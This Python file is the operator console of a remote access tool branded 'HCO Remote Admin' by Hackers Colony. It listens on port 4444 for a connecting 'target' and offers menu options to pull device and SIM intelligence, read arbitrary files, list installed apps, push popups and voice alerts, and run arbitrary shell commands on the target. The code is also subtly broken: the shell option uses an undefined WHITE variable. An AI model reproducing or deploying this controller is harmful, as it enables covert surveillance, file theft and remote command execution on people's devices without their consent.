import socket
import sys

# ANSI Color & Style Codes
RESET = "\033[0m"
BOLD = "\033[1m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"

def draw_box(title, content_list):
    print(f"\n{CYAN}┌──────────────────────────────────────────────┐{RESET}")
    print(f"{CYAN}│{BOLD} {title.center(44)} {RESET}{CYAN}│{RESET}")
    print(f"{CYAN}├──────────────────────────────────────────────┤{RESET}")
    for item in content_list:
        print(f"{CYAN}│{RESET} {item:<44} {CYAN}│{RESET}")
    print(f"{CYAN}└──────────────────────────────────────────────┘{RESET}")

def show_menu():
    print(f"\n{MAGENTA}=================================================={RESET}")
    print(f"{GREEN}{BOLD}        HCO REMOTE ADMIN (CONTROL CENTER)         {RESET}")
    print(f"{MAGENTA}           Coded by Azhar (Hackers Colony)        {RESET}")
    print(f"{MAGENTA}=================================================={RESET}")
    print(f" {YELLOW}[1]{RESET} {CYAN}Deep Target Intel (Brand, RAM, SIM, Network){RESET}")
    print(f" {YELLOW}[2]{RESET} {CYAN}Send Voice Alert (Text-to-Speech){RESET}")
    print(f" {YELLOW}[3]{RESET} {CYAN}Download / Read File From Target{RESET}")
    print(f" {YELLOW}[4]{RESET} {CYAN}Push Auto-Note / Screen Popup{RESET}")
    print(f" {YELLOW}[5]{RESET} {CYAN}List All Installed Applications (Apps){RESET}")
    print(f" {YELLOW}[6]{RESET} {CYAN}Check Battery & Storage Health{RESET}")
    print(f" {YELLOW}[7]{RESET} {CYAN}Execute Custom Shell Command{RESET}")
    print(f" {YELLOW}[8]{RESET} {RED}Exit Remote Session{RESET}")
    print(f"{MAGENTA}=================================================={RESET}")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 4444))
    server.listen(1)
    
    draw_box("HCO SERVER STATUS", [f"{GREEN}Status: Listening on Port 4444{RESET}", f"{YELLOW}Waiting for target connection...{RESET}"])
    
    conn, addr = server.accept()
    draw_box("CONNECTION ESTABLISHED", [f"{GREEN}Target IP: {addr[0]}{RESET}", f"{GREEN}Status: Secured & Active{RESET}"])
    
    while True:
        show_menu()
        choice = input(f"{BOLD}{YELLOW}HCO-ControlCenter> {RESET}").strip()
        
        if choice == '1':
            conn.send(b'sysinfo')
            print(f"\n{YELLOW}[*] Extracting deep hardware, operator & network specs...{RESET}")
            output = conn.recv(16384).decode()
            print(f"\n{GREEN}================ TARGET INTEL REPORT ================{RESET}")
            print(output)
            print(f"{GREEN}====================================================={RESET}")
            
        elif choice == '2':
            msg = input(f"{YELLOW}[?] Enter text to speak on target speaker: {RESET}")
            conn.send(f"alert:{msg}".encode())
            output = conn.recv(1024).decode()
            print(f"\n{GREEN}[+] {output}{RESET}")
            
        elif choice == '3':
            file_path = input(f"{YELLOW}[?] Enter absolute file path (e.g., /sdcard/download/file.txt): {RESET}")
            conn.send(f"download:{file_path}".encode())
            output = conn.recv(16384).decode()
            print(f"\n{BLUE}=================== FILE DATA ==================={RESET}")
            print(output)
            print(f"{BLUE}================================================={RESET}")
            
        elif choice == '4':
            note_text = input(f"{YELLOW}[?] Enter popup alert message for target screen: {RESET}")
            conn.send(f"popup:{note_text}".encode())
            output = conn.recv(1024).decode()
            print(f"\n{GREEN}[+] {output}{RESET}")
            
        elif choice == '5':
            conn.send(b'apps')
            print(f"\n{YELLOW}[*] Fetching installed applications database...{RESET}")
            output = conn.recv(32768).decode()
            print(f"\n{MAGENTA}================ INSTALLED APPS ================{RESET}")
            print(output)
            print(f"{MAGENTA}================================================{RESET}")
            
        elif choice == '6':
            conn.send(b'battery')
            print(f"\n{YELLOW}[*] Querying battery and disk storage stats...{RESET}")
            output = conn.recv(8192).decode()
            print(f"\n{CYAN}=============== BATTERY & STORAGE ==============={CYAN}")
            print(output)
            print(f"{CYAN}================================================={RESET}")
            
        elif choice == '7':
            cmd = input(f"{BOLD}{RED}HCO-Shell> {RESET}")
            if cmd.strip() == "": continue
            conn.send(f"cmd:{cmd}".encode())
            output = conn.recv(16384).decode()
            print(f"\n{WHITE}---------------- SHELL OUTPUT ----------------\n{output}\n----------------------------------------------")
            
        elif choice == '8':
            conn.send(b'exit')
            print(f"{RED}[*] Closing session securely. Goodbye!{RESET}")
            break
        else:
            print(f"{RED}[[-] Invalid selection! Choose between 1-8.{RESET}")
            
    conn.close()
    server.close()

if __name__ == "__main__":
    start_server()
            
